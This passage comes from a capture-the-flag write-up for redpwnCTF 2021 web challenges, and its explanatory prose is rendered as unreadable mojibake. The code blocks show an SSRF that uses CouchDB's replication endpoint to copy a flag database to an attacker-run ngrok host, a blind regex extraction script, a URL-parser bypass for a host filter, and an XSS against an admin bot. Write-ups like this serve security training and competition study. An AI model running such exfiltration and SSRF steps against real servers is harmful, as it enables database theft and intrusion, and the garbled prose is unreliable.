&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://localhost:8080/testAPI&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 2,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00ed5b&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-cee1919fc2eda9a6068ed2792608a9dd&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>,
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-f8744c7d9e172ac4b188fbb8f337a204&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e"># There is a new ID 99ea668366ac9d5d74fd2bc91c00fd09!&lt;/span>
$ curl -s http://neptunian:neptunian@couchdb:5984/neptunian/99ea668366ac9d5d74fd2bc91c00fd09 &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;99ea668366ac9d5d74fd2bc91c00fd09&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-f8744c7d9e172ac4b188fbb8f337a204&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;some_int&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;some_string&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;c&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¶³ä»¥è¯æ˜æˆ‘ä»¬è‡ªå·±æ„é€ çš„å¸¦testAPIçš„ç¼åˆæ€ªæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œcouchdbç›¸å…³çš„å¢åˆ æŸ¥æ”¹åŠŸèƒ½çš„&lt;/p>
&lt;p>è€Œé‡è¦çš„æ˜¯è¿œç¨‹ä¹Ÿèƒ½æ‰“é€šï¼Œè¿™é‡Œæœ‰è¿™ä¹ˆä¸ªå¥½ä¸œè¥¿https://docs.couchdb.org/en/3.1.1/replication/replicator.htmlï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€ç»„postæ•°æ®å°±å¯ä»¥è¿œç¨‹å¾—åˆ°ä¸€ä»½æ•°æ®ï¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-json" data-lang="json">&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#f92672">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;source_db_name&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#f92672">&amp;#34;target&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://dest_user:dest_password@destination_host/dest_database&amp;#34;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>è‡³äºåšæ³•å°±å¾ˆç®€å•äº†ï¼šå…ˆç”¨ngrokæä¸€ä¸ªç½‘ä¸Šå¯è®¿é—®çš„couchdbï¼Œå¾—åˆ°ä¸´æ—¶çš„url &lt;a href="https://2d0a4710580a.ngrok.io">https://2d0a4710580a.ngrok.io&lt;/a>ï¼Œå…ˆåˆ›å»ºæ•°æ®åº“æ¥ä¾¿äºæ¥æ”¶ä¹‹åå¤åˆ¶çš„æ•°æ®&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -X PUT https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag
&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>:true&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ç„¶åå°±å¯ä»¥åˆ©ç”¨replicatorå’Œç²¾å¿ƒæ„é€ çš„jsonæ•°æ®å¤§æç‰¹æäº†ï¼å…ˆæœ¬åœ°&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#39;Accept&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&amp;#39;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e"># POST Replication&lt;/span>
&lt;span style="color:#111">params&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;url&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://neptunian:neptunian@couchdb:5984@couchdb:5984/_replicate&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;method&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>
&lt;span style="color:#d88200">&amp;#34;source&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;neptunian&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;target&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">&amp;#34;https://tempadm:tempadm12@2d0a4710580a.ngrok.io/neptunian_flag&amp;#34;&lt;/span>
&lt;span style="color:#111">})&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># response = requests.get(&amp;#39;http://localhost:8080/testAPI&amp;#39;, headers=headers, params=params)&lt;/span>
&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;https://requester.mc.ax/testAPI&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">params&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">params&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/_all_docs &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;total_rows&amp;#34;&lt;/span>: 1,
&lt;span style="color:#d88200">&amp;#34;offset&amp;#34;&lt;/span>: 0,
&lt;span style="color:#d88200">&amp;#34;rows&amp;#34;&lt;/span>: &lt;span style="color:#f92672">[&lt;/span>
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;key&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>: &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">]&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
$ curl -s http://tempadm:tempadm12@couchdb:5984/flagdb/d139bf6ab1733d779f64e9c6c4026de9 &lt;span style="color:#111">|&lt;/span> jq
&lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;_id&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;d139bf6ab1733d779f64e9c6c4026de9&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;_rev&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;1-4bb8f6dafef84b2d856fe1444f38b0a2&amp;#34;&lt;/span>,
&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>: &lt;span style="color:#d88200">&amp;#34;flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&amp;#34;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å¥½è€¶ï¼å¤åˆ¶æ€ªå¥½è€¶ï¼&lt;/p>
&lt;p>è™½ç„¶ä¸Šé¢è¯´äº†è¿™ä¹ˆå¤šï¼Œå…¶å®æ ¸å¿ƒæ€è·¯ä¹ŸæŒºæ¸…æ™°çš„ï¼Œå°±æ˜¯å…ˆè®¤çœŸåˆ†ææºç  æ‰¾å‡ºæ¼æ´ç‚¹æ˜¯ç”¨couchdbåˆ›å»ºç”¨æˆ·æ—¶ä¼šè‡ªåŠ¨æ’å…¥flag è¿™ä¸ªè¿‡ç¨‹æ˜¯ä½¿ç”¨httpè¯·æ±‚ æˆ‘ä»¬å¾ˆå®¹æ˜“å°±å¯ä»¥æ„é€ ä¸€ä¸ªurlåˆ›å»ºç”¨æˆ· è®©flagè¿›å…¥è‡ªå·±æŒæ§çš„æ•°æ®åº“ä¸­ï¼Œä¹‹åå°±å¯ä»¥é¡ºç•…çš„è¿›è¡Œæ•°æ®åº“çš„å¢åˆ æŸ¥æ”¹ï¼›ä½†æ˜¯è¿™è¿˜éœ€è¦æ¥ä¸Šé¢˜ç›®ä¸­ç»™å‡ºçš„testAPIå…¥å£æ‰è¡Œï¼Œåˆç»è¿‡ä¸€äº›æ„é€ å¯ä»¥æˆåŠŸç¼åˆï¼›ä½†æ˜¯ç”±äºé¸¡è´¼çš„è®¾ç½® testAPIå¤„çš„è¯·æ±‚åªä¼šè¿”å›æˆåŠŸæˆ–å¤±è´¥ï¼Œä¸ºäº†ç¡®åˆ‡çš„å¾—åˆ°flagï¼Œæˆ‘ä»¬åˆ©ç”¨äº†couchdbçš„_replicatorè¿™ä¸ªå¥½ä¸œè¥¿æ¥è¿›è¡Œä¸€ä¸ªæ•°æ®çš„å¤åˆ¶ï¼Œå¾—åˆ°flag~~~&lt;/p>
&lt;p>â€”â€”â€”â€”ä»¥ä¸‹æ˜¯ç¬¬äºŒç§è§£æ³•: char-by-char-blind-sqli&lt;/p>
&lt;p>æºç çš„åˆ†æä¸å˜ï¼Œè¿™æ˜¯æ ¹æœ¬ï¼Œå·®å¼‚ä¹‹å¤„é¦–å…ˆåœ¨äºæ„é€ urlæ—¶è¿™é‡Œåˆ©ç”¨äº†couchdbçš„å¦ä¸€ä¸ªå¥½ä¸œè¥¿_find&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">curl -X POST -H &lt;span style="color:#d88200">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://strellicsquad:12345@couchdb:5984/strellicsquad/_find&amp;#39;&lt;/span> --data &lt;span style="color:#d88200">&amp;#39;{&amp;#34;selector&amp;#34;:{&amp;#34;flag&amp;#34;: {&amp;#34;$regex&amp;#34;: &amp;#34;.*&amp;#34;}}}&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æœ¬åœ°æµ‹è¯•å¯ä»¥æˆåŠŸä¼šæ˜¾å‡ºflagï¼›ç¬¬äºŒä¸ªå·®å¼‚åœ¨ç¼åˆtestAPIçš„æ—¶å€™ï¼Œç”±äºfilterå¯¹äºå¤§å°å†™ä¸å¤ªæ•æ„Ÿï¼Œæ‰€ä»¥å¤§å†™Couchæ¥ç»•è¿‡äº†ï¼›åŒæ ·é¢ä¸´å›æ˜¾åªæœ‰æˆåŠŸæˆ–å¤±è´¥ ä½†æ˜¯char-by-char-blind-sqliæ— æ‰€ç•æƒ§~&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">urllib.parse&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">string&lt;/span>
&lt;span style="color:#75715e"># first, make a request to&lt;/span>
&lt;span style="color:#75715e"># /createUser?username=strellicsquad&amp;amp;password=12345&lt;/span>
&lt;span style="color:#111">alphabet&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;etoanihsrdlucgwyfmpbkvjxqz&lt;/span>&lt;span style="color:#d88200">{}&lt;/span>&lt;span style="color:#d88200">_01234567890ETOANIHSRDLUCGWYFMPBKVJXQZ&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">test_regex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">regex&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://strellicsquad:12345@Couchdb:5984/strellicsquad/_find&amp;#34;&lt;/span>
&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;selector&amp;#34;&lt;/span>&lt;span style="color:#111">:{&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;$regex&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">regex&lt;/span>&lt;span style="color:#111">}}})&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://requester.mc.ax/testAPI/?url=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;amp;method=POST&amp;amp;data=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something went wrong&amp;#34;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag{&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">endswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;}&amp;#34;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">alphabet&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;^&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;.*&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test_regex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">check&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;found &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200"> -&amp;gt; &lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#d88200">}{&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">c&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¹Ÿå¯ä»¥æ‹¿flag~~ flag{JaVA_tHE_GrEAteST_WeB_lANguAge_32154}&lt;/p>
&lt;p>â€”â€”â€”â€”æœ€æ‚²å‚¬çš„è«è¿‡äºä¹‹åæˆ‘ä¹Ÿç”¨dockeråœ¨æœ¬åœ°èµ·äº†ä¸€ä¸ªç¯å¢ƒ ä½†æ˜¯åˆå§‹åŒ–æœ‰é—®é¢˜ï¼Œå¯¼è‡´localhost:5984æ— æ³•è®¿é—®&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210720093017634.png" alt="image-20210720093017634">&lt;/p>
&lt;p>æˆ‘æœäº†ä¸€ä¸‹ æœ‰ç›¸å…³é—®é¢˜çš„è§£ç­” ä½†éƒ½ä¸æ˜ç¡®â€¦â€¦&lt;/p>
&lt;p>ä»è¿™ä¸ªæŠ¥é”™çœ‹ åº”è¯¥æ˜¯è¯´é¢˜ç›®ç›¸å…³çš„éœ€è¦çš„database_does_not_existï¼Œä½†æ˜¯ç”¨äºåˆå§‹åŒ–çš„/_utilsä¹Ÿæ— æ³•è®¿é—®ï¼Œç›´æ¥&lt;code>curl 127.0.0.1:5984&lt;/code>ä¹Ÿæ˜¯å¤±è´¥ï¼Œ&lt;code>curl couchdb:5984&lt;/code>ä¹Ÿæ˜¯å¤±è´¥ï¼Œå¤„ç†æŠ¥é”™çœŸæ˜¯å¿ƒç´¯&lt;/p>
&lt;h2 id="webrequester-strikes-back">web/requester-strikes-back&lt;/h2>
&lt;blockquote>
&lt;p>Java was found to not be the future. Can you take down requester again?&lt;/p>
&lt;/blockquote>
&lt;p>æºç å¤„æœ‰ä¸€å¤„ä¿®æ”¹&lt;code>if (urlURI.getHost().toLowerCase().contains(&amp;quot;couchdb&amp;quot;))&lt;/code>&lt;/p>
&lt;p>è¿™ä½¿å¾—æˆ‘ä»¬ä¸èƒ½ç”¨ä¹‹å‰çš„Couchdbå¤§å†™çš„æ–¹å¼æ¥ç»•è¿‡ï¼Œä½†æ˜¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155508706.png" alt="image-20210806155508706">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806155558838.png" alt="image-20210806155558838">&lt;/p>
&lt;p>ç»“åˆ&lt;a href="https://mail-archives.apache.org/mod_mbox/hc-commits/202009.mbox/%3C20200930085030.C135C82908@gitbox.apache.org%3E">Incorrect handling of malformed authority component by URIUtils#extractHost&lt;/a>&lt;/p>
&lt;p>æˆ‘ä»¬åªéœ€è¦æŠŠä¹‹å‰çš„urlæ”¹æˆ&lt;code>http://strellicsquad:12345@couchdb:5984@pepegaclapwr/strellicsquad/_find&lt;/code>å³å¯ï¼ˆè§£æ³•äºŒï¼‰&lt;/p>
&lt;p>è§£æ³•ä¸€ç›´æ¥è·‘å°±è¡Œ ä¸€æ ·èƒ½é€š&lt;/p>
&lt;p>ç›¸å…³çš„ä¸€äº›ssrfå‰ç½®çŸ¥è¯†&amp;amp;urlè§£æé—®é¢˜ä»ç„¶å¯ä»¥çœ‹è¿™é‡Œï¼š&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages! - ğŸŠOrange Tsai&lt;/a>ï¼ˆå¥½å‰å®³çš„pptï¼‰&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/#requester-strikes-back">wp1&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester-strikes-back">wp2&lt;/a>&lt;/p>
&lt;h2 id="webpastebin-1">web/pastebin-1&lt;/h2>
&lt;blockquote>
&lt;p>Ah, the classic pastebin.&lt;/p>
&lt;p>&lt;a href="https://pastebin-1.mc.ax/">pastebin-1.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://admin-bot.mc.ax/pastebin-1">Admin bot&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/4313574d2348012d122d849530c4f18340644d88ea04f0cbb4932bd35efde1da/main.rs">main.rs&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>pastebinï¼Œç±»ä¼¼ç•™è¨€æ¿çš„æ ·å­ å¯ä»¥å‘è¡¨paste&lt;/p>
&lt;p>ç¬¬ä¸€ååº”å°±æ˜¯xssï¼Œè¯•ä¸€ä¸‹alert(1) æˆåŠŸå¼¹çª—&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093018218.png" alt="image-20210710093018218">&lt;/p>
&lt;p>é¢˜ç›®å¦å¤–æä¾›äº†ä¸€ä¸ª/admin-boté¡µé¢ï¼Œ&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710093113748.png" alt="image-20210710093113748">&lt;/p>
&lt;p>è¿™ä¸ªï¼Œå¦¥å¦¥çš„xsså¥½å§ ç›´æ¥xss platformä¸€æŠŠæ¢­ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710094254880.png" alt="image-20210710094254880">&lt;/p>
&lt;h2 id="webpastebin-2-social-edition">***web/pastebin-2-social-edition&lt;/h2>
&lt;blockquote>
&lt;p>Pastebin, now with comments. Send cool stuff to the admin! If they like it, they might even leave you a note.&lt;/p>
&lt;p>&lt;a href="https://pastebin-2-social-edition.mc.ax/">pastebin-2-social-edition.mc.ax&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://admin-bot.mc.ax/pastebin-2-social-edition">Admin bot&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>è¿™æ¬¡adminbotä¼šç»™è‡ªå·±çš„pasteä¸‹é¢ç•™è¨€å›å¤&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/8Vc6Cyf.png" alt="8Vc6Cyf.png">&lt;/p>
